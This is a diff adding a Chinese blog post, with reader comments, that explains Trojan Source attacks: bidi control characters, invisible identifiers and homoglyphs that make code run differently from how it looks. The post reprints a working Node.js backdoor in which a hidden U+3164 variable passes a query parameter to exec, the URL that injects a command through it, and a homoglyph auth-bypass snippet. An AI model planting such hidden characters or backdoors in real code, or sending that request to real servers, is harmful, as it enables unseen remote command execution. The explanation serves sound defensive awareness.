@@ -1,0 +1,485 @@
+<!DOCTYPE html><!--[if IE 8]>
+<html id="ie8" dir="ltr" lang="zh-CN"
+	prefix="og: https://ogp.me/ns#" >
+<![endif]--><!--[if !(IE 8) ]><!--><html dir="ltr" lang="zh-CN" prefix="og: https://ogp.me/ns#"><!--<![endif]--><head><meta charset="UTF-8"/><title>源代码特洛伊木马攻击 | 酷 壳 - CoolShell</title><link rel="stylesheet" type="text/css" href="/assets/all.min.css"/><link rel="shortcut icon" href="/assets/favicon.png"/></head>
+<body class="post-template-default single single-post postid-21649 single-format-standard group-blog">
+
+<div id="page" class="hfeed site">
+
+<div class="container">
+<div class="row">
+
+</div>
+</div>
+<div id="content" class="site-content">
+<div class="container">
+<div class="row">
+<div id="primary" class="content-area  col-md-12" style="margin-top: 40px;">
+<main id="main" role="main">
+<article id="post-21649" class="post-content post-21649 post type-post status-publish format-standard hentry category-netsecurity tag-hacker tag-unicode tag-871">
+<header class="entry-header">
+<span class="screen-reader-text">源代码特洛伊木马攻击</span>
+<h1 class="entry-title">源代码特洛伊木马攻击</h1>
+<div class="entry-meta">
+<h5 class="entry-date"><i class="fa fa-calendar-o"></i> <a href="/articles/21649.html" title="17:02" rel="bookmark"><time class="entry-date" datetime="2021-11-19T17:02:46+08:00" pubdate="">2021年11月19日 </time></a><span class="byline"><span class="sep"></span><i class="fa fa-user"></i>
+<span class="author vcard"><a class="url fn n" href="/articles/author/haoel" title="View all posts by 陈皓" rel="author">陈皓</a></span></span> <i class="fa fa-comments-o"></i><span class="screen-reader-text">评论 </span> <a href="/articles/21649.html#comments" class="comments-link">23 条评论</a> <i class="fa fa-users" style="margin-left:10px;"></i> 37,275 人阅读</h5>
+</div>
+</header>
+<div class="entry-content">
+<p><img decoding="async" class="alignright size-full wp-image-21658" src="/uploads/2021/11/il_340x270_pggv.jpg" alt="" width="340" height="270" srcset="" sizes="(max-width: 340px) 100vw, 340px"/>最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21652" src="/uploads/2021/11/1637305049427-1024x329.jpg" alt="" width="640" height="206" srcset="" sizes="(max-width: 640px) 100vw, 640px"/></p>
+<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title="ISO/IEC 8859-6" href="https://en.wikipedia.org/wiki/ISO/IEC_8859-6">ISO/IEC 8859-6</a>和<a title="ISO/IEC 8859-8" href="https://en.wikipedia.org/wiki/ISO/IEC_8859-8">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>
+<p><span id="more-21649"></span></p>
+<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>
+<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href="https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/" target="_blank" rel="noopener">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>
+<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
+
+import &#34;fmt&#34;
+
+func main() {
+  str, mask := &#34;Hello, World!‮10x‭&#34;, 0
+
+  bits := 0
+  for _, ch := range str {
+    for ch &gt; 0 {
+      bits += int(ch) &amp; mask
+      ch = ch &gt;&gt; 1
+    }
+  }
+  fmt.Println(&#34;Total bits set:&#34;, bits)
+}</pre>
+<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  –<a href="https://play.golang.org/p/e2BDZvFlet0" target="_blank" rel="noopener"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>
+<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21653" src="/uploads/2021/11/1637307319589.jpg" alt="" width="500" height="324" srcset="" sizes="(max-width: 500px) 100vw, 500px"/></p>
+<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href="https://www.compart.com/en/unicode/bidiclass" target="_blank" rel="noopener">Unicode Bidirectional Classes</a>）：</p>
+<ul>
+<li><strong>U+202E – Right-to-Left Override [RLO] </strong><br/>
+表示，开始从右到左显示，于是，接下来的文本 <code>10x&#34;, 0</code> 变成了 <code>0 ,&#34;x01</code></li>
+<li><strong>U+202D – Left-to-Right Override [LRO]</strong><br/>
+表示，开始从左到右显示，于是，<code>0,&#34;x01</code> 中的前4个字符<code>0 ,&#34;</code> 反转成  <code>&#34;, 0</code>，于是整个文本成了 <code>&#34;, 0x01</code></li>
+</ul>
+<p>所以，你在视觉上看到的是结果是—— <code>&#34;Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>
+<p>然后，Github官方博客中还给了一个安全问题 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574">CVE-2021-42574</a> ——</p>
+<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>
+<p>这个安全问题在剑桥大学的这篇论文“<a href="https://www.trojansource.codes/" target="_blank" rel="noopener">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>
+<p>通过双向文本可以把下面这段代码：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21655" src="/uploads/2021/11/1637308872541.jpg" alt="" width="569" height="240" srcset="" sizes="(max-width: 569px) 100vw, 569px"/></p>
+<p>伪装成下面的这个样子：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21654" src="/uploads/2021/11/1637308847435.jpg" alt="" width="580" height="245" srcset="" sizes="(max-width: 580px) 100vw, 580px"/></p>
+<p>在图 2 中<code>&#39;alice&#39;</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>
+<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> – </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>
+<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href="https://certitude.consulting/blog/en/invisible-backdoor/" target="_blank" rel="noopener">The Invisible Javascript Backdoor</a>”里的这个示例：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">const express = require(&#39;express&#39;);
+const util = require(&#39;util&#39;);
+const exec = util.promisify(require(&#39;child_process&#39;).exec);
+
+const app = express();
+
+app.get(&#39;/network_health&#39;, async (req, res) =&gt; {
+    const { timeout,ㅤ} = req.query;
+    const checkCommands = [
+        &#39;ping -c 1 google.com&#39;,
+        &#39;curl -s http://example.com/&#39;,ㅤ
+    ];
+
+    try {
+        await Promise.all(checkCommands.map(cmd =&gt; 
+                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));
+        res.status(200);
+        res.send(&#39;ok&#39;);
+    } catch(e) {
+        res.status(500);
+        res.send(&#39;failed&#39;);
+    }
+});
+
+app.listen(8080);</pre>
+<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>
+<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21656" src="/uploads/2021/11/1637310735683-1024x923.jpg" alt="" width="640" height="577" srcset="" sizes="(max-width: 640px) 100vw, 640px"/></p>
+<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>
+<p style="text-align: center;"><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>
+<p>其中的，%E3%85%A4 就是 <code>\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>
+<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="c">if(environmentǃ=ENV_PROD){
+    // bypass authZ checks in DEV
+    return true;
+}</pre>
+<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>
+<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>
+<p>（全文完）</p>
+<p> </p>
+<p> </p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div id="post-ratings-21649-loading" class="post-ratings-loading"><img src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif" width="16" height="16" class="post-ratings-image"/>Loading...</div>
+</div>
+<footer class="entry-footer">
+<hr/><div class="row"><div class="col-md-6 cattegories"><span class="cat-links"><i class="fa fa-folder-open"></i>
+<a href="javascript:void(0)" rel="category tag">网络安全</a></span></div><div class="col-md-6 tags"><span class="tags-links"><i class="fa fa-tags"></i> <a href="javascript:void(0)" rel="tag">hacker</a>, <a href="javascript:void(0)" rel="tag">Unicode</a>, <a href="javascript:void(0)" rel="tag">木马</a></span></div></div> </footer>
+</article>
+
+<div class="fixed"></div> 
+</main>
+
+<div class="post-comments">
+<div id="comments" class="comments-area">
+<h2 class="comments-title">
+《<span>源代码特洛伊木马攻击</span>》的相关评论 </h2>
+<ol class="comment-list">
+<li id="comment-2336402" class="comment even thread-even depth-1">
+<article id="div-comment-2336402" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/efbe41e5b2db8dce65a8245b0be3c4cf?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/efbe41e5b2db8dce65a8245b0be3c4cf?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">hjm77</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2336402"><time datetime="2021-11-19T17:39:23+08:00">2021年11月19日 17:39</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>文章”浅蓝色”中间存在特殊字符，导致rss解析失败</p>
+</div>
+ </article>
+</li>
+<li id="comment-2336772" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2336772" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/f105a6ae85f495b15fee4d89dcb3d6e7?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/f105a6ae85f495b15fee4d89dcb3d6e7?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">122</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2336772"><time datetime="2021-11-20T08:55:57+08:00">2021年11月20日 08:55</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>终于看到有人写出这些东西了, github上某些FQ控制面板web管理系统,也应用了类似的技巧,留下了后门.</p>
+</div>
+ </article>
+</li>
+<li id="comment-2337381" class="comment even thread-even depth-1 parent">
+<article id="div-comment-2337381" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/06d576d93823762c00d743829c0eabe6?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/06d576d93823762c00d743829c0eabe6?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">qrush</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2337381"><time datetime="2021-11-21T11:35:04+08:00">2021年11月21日 11:35</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>0,”x01 这里 0 和 , 之间少了一个空格吧</p>
+</div>
+ </article>
+<ol class="children">
+<li id="comment-2337394" class="comment byuser comment-author-haoel bypostauthor odd alt depth-2">
+<article id="div-comment-2337394" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/af2fbb7372dd5826e44d87e6ceccea40?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/af2fbb7372dd5826e44d87e6ceccea40?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="https://coolshell.cn" class="url" rel="ugc">陈皓</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2337394"><time datetime="2021-11-21T12:06:01+08:00">2021年11月21日 12:06</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>没有少，被 web 排版的换行去掉了。</p>
+</div>
+ </article>
+</li>
+</ol>
+</li>
+<li id="comment-2337468" class="comment even thread-odd thread-alt depth-1">
+<article id="div-comment-2337468" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/0a440a9619579f1429aa17ed946ce69c?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/0a440a9619579f1429aa17ed946ce69c?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="https://jasonkayzk.github.io/" class="url" rel="ugc external nofollow">jasonkay</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2337468"><time datetime="2021-11-21T15:59:43+08:00">2021年11月21日 15:59</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>太神奇了，学习了！</p>
+</div>
+ </article>
+</li>
+<li id="comment-2338517" class="comment odd alt thread-even depth-1">
+<article id="div-comment-2338517" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/a89317f0d0bf8fe10d758d75029533a6?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/a89317f0d0bf8fe10d758d75029533a6?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">大魏</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2338517"><time datetime="2021-11-22T18:06:12+08:00">2021年11月22日 18:06</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>虽然对网络安全不太懂，但是对于特洛伊这个电影还是比较了解的。</p>
+</div>
+ </article>
+</li>
+<li id="comment-2338932" class="comment even thread-odd thread-alt depth-1">
+<article id="div-comment-2338932" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/892b8061122c9f456dd492c40221cd29?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/892b8061122c9f456dd492c40221cd29?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">杨志强</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2338932"><time datetime="2021-11-23T18:58:34+08:00">2021年11月23日 18:58</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>有意思</p>
+</div>
+ </article>
+</li>
+<li id="comment-2339730" class="comment odd alt thread-even depth-1">
+<article id="div-comment-2339730" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/722cc9084fda9bbe6e963822dc08e76a?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/722cc9084fda9bbe6e963822dc08e76a?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">lazy</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2339730"><time datetime="2021-11-25T10:01:23+08:00">2021年11月25日 10:01</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>RSS订阅您的网站报错了！<br/>
+Sorry<br/>
+This feed does not validate.</p>
+<p>line 64, column 9: XML parsing error: :64:9: not well-formed (invalid token) [help]</p>
+<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> …</p>
+</div>
+ </article>
+</li>
+<li id="comment-2339816" class="comment even thread-odd thread-alt depth-1 parent">
+<article id="div-comment-2339816" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/b76aca454b6c7af9a45a17f7af53c458?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/b76aca454b6c7af9a45a17f7af53c458?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">galian</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2339816"><time datetime="2021-11-25T15:24:47+08:00">2021年11月25日 15:24</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>陈老师，这个URL 「http://host:port/network_health?%E3%85%A4=」中的 「%E3%85%A4」可不可以替换成其他 Unicode 的 UTF-8 编码？<br/>
+从 URL 参数解码的角度看，这个「%E3%85%A4」 替换成其他，感觉也可以。这个值最终是赋给 timeout 了，而 赋给了这个变量 \u3164。<br/>
+我理解的对吗？<br/>
+谢谢陈老师！</p>
+</div>
+ </article>
+<ol class="children">
+<li id="comment-2339817" class="comment odd alt depth-2">
+<article id="div-comment-2339817" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/b76aca454b6c7af9a45a17f7af53c458?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/b76aca454b6c7af9a45a17f7af53c458?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">galian</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2339817"><time datetime="2021-11-25T15:28:32+08:00">2021年11月25日 15:28</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>有个尖括号的 any_command 被吃掉了。<br/>
+再发一遍完整的。<br/>
+陈老师，这个URL 「http://host:port/network_health?%E3%85%A4=any_command」中的 「%E3%85%A4」可不可以替换成其他 Unicode 的 UTF-8 编码？<br/>
+从 URL 参数解码的角度看，这个「%E3%85%A4」 替换成其他，感觉也可以。这个值最终是赋给 timeout 了，而 赋any_command 给了这个变量 \u3164。之后遍历 cmds 时，执行的是 \u3164 变量的值 any_command<br/>
+我理解的对吗？<br/>
+谢谢陈老师！</p>
+</div>
+ </article>
+</li>
+</ol>
+</li>
+<li id="comment-2340791" class="comment even thread-even depth-1">
+<article id="div-comment-2340791" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/70fce0657816a98f439651a65448e69e?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/70fce0657816a98f439651a65448e69e?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="https://tie.pub" class="url" rel="ugc external nofollow">吴</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2340791"><time datetime="2021-11-27T12:22:29+08:00">2021年11月27日 12:22</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>很神奇</p>
+</div>
+ </article>
+</li>
+<li id="comment-2342279" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2342279" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/7bfd853d36b03fbc8085fb4520821153?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/7bfd853d36b03fbc8085fb4520821153?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://kiku.vip" class="url" rel="ugc external nofollow">Kiku</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2342279"><time datetime="2021-11-30T16:09:46+08:00">2021年11月30日 16:09</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>所见非所得，眼睛也是会骗人的！<br/>
+和多年前的利用 Unicode 同形异义字假冒域名钓鱼攻击很类似。<br/>
+Unicode 同形异义字举例：斯拉夫字母“а” （U+0430）和拉丁字母“a”（U+0041）会被浏览器处理成不同的字符，但是在地址栏当中都显示为“a”</p>
+</div>
+ </article>
+</li>
+<li id="comment-2343774" class="comment even thread-even depth-1">
+<article id="div-comment-2343774" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/c50b4c7ffc69f49b6fa7e1c8664d6078?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/c50b4c7ffc69f49b6fa7e1c8664d6078?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">wsfy15</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2343774"><time datetime="2021-12-04T17:56:32+08:00">2021年12月04日 17:56</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>python的case里，我觉得实际显示的应该是<br/>
+”’ …… then rnuter; ”’，而不是”’ …… then return; ”’。不知道我理解得对吗？<br/>
+RLI 的作用域是仅在那一行生效吗，不会影响后面的内容？</p>
+</div>
+ </article>
+</li>
+<li id="comment-2344945" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2344945" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/ee31c8bafb9f51142f71c14717425c4f?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/ee31c8bafb9f51142f71c14717425c4f?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="https://52zmt.cn/" class="url" rel="ugc external nofollow">自媒体运营</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2344945"><time datetime="2021-12-07T11:46:11+08:00">2021年12月07日 11:46</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>不错，必须顶一下！</p>
+</div>
+ </article>
+</li>
+<li id="comment-2345098" class="comment even thread-even depth-1">
+<article id="div-comment-2345098" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/45a1f4cb6ebfa74eff9e03c337008ffe?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/45a1f4cb6ebfa74eff9e03c337008ffe?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">WSK</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2345098"><time datetime="2021-12-07T18:55:22+08:00">2021年12月07日 18:55</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>老外就是多事，显示的问题，硬要编码到内码之中，产生无数的BUG。</p>
+</div>
+ </article>
+</li>
+<li id="comment-2345977" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2345977" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/59c25fc2e207a2d29038d5d8cc379e8f?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/59c25fc2e207a2d29038d5d8cc379e8f?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">zzh</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2345977"><time datetime="2021-12-09T14:26:39+08:00">2021年12月09日 14:26</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>之前几天也是被类似的问题坑了ANSI编码下“鈥婥”，在utf-8的情况下显示大写的“C”，写入数据库的时候始终多一位,和对方不停扯皮</p>
+</div>
+ </article>
+</li>
+<li id="comment-2348661" class="comment even thread-even depth-1">
+<article id="div-comment-2348661" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/e631b095a7ec027892060041713b3f39?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/e631b095a7ec027892060041713b3f39?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://dashen.tech/" class="url" rel="ugc external nofollow">fliter</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2348661"><time datetime="2021-12-15T13:47:49+08:00">2021年12月15日 13:47</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>可奖在后面被执行–&gt;可将在后面被执行</p>
+</div>
+ </article>
+</li>
+<li id="comment-2350201" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2350201" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/6131b4518d6747394d9fcbc3e8dbaaf1?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/6131b4518d6747394d9fcbc3e8dbaaf1?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">饭团君</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2350201"><time datetime="2021-12-19T20:37:33+08:00">2021年12月19日 20:37</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>vscode可以显示控制字符的, 在设置中搜”控制字符”或者”control characters”, 当有控制字符, 则会高亮显示, 所以用vscode开发的话, 稍微注意点各种标识, 应该可以避免这个问题</p>
+</div>
+ </article>
+</li>
+<li id="comment-2358359" class="comment even thread-even depth-1">
+<article id="div-comment-2358359" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/8fe9bf6aa877e15029954e7e77fc90cb?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/8fe9bf6aa877e15029954e7e77fc90cb?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">Jinjing Wu</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2358359"><time datetime="2022-01-10T21:54:56+08:00">2022年01月10日 21:54</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>node 示例中：</p>
+<p><code>// Line 16<br/>
+cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));<br/>
+</code></p>
+<p>其中的 <code>5_000</code></p>
+<p>根据下面的图及语义来讲，应该是 <code>5000</code><br/>
+即：</p>
+<p><code>// Line 16<br/>
+cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5000 })));<br/>
+</code></p>
+</div>
+ </article>
+</li>
